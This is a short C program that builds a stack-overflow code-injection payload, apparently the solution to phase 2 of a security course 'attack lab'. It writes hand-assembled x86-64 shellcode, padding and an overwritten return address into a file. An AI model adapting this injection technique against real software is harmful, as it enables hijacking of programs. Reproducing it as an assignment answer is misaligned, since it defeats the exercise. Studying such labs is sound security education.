#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
int main()
{
	int fd = open("phase2.txt" , O_WRONLY | O_CREAT | O_APPEND);
	if(fd == -1){
		return 1;
	}
	const char p[] = {0xbf , 0xfa , 0x97 , 0xb9 , 0x59 , 0x48 , 0x83 , 0xec,
					  0x08 , 0x48 , 0xc7 , 0x04 , 0x24 , 0xec , 0x17 , 0x40,
					  0x00 , 0xc3 };
	const char p1[] = {0x78 , 0xdc , 0x61 , 0x55, 0x00 , 0x00 , 0x00 , 0x00};
	//40 - 18 = 22
	char tmp[22];
	
	write(fd , (char *)p , 18);
	write(fd , (char *)tmp , 22);
	write(fd , (char *)p1 , 8);
	
	close(fd);
	printf("len = %ld success\n" , sizeof(p));
	return 0;
}
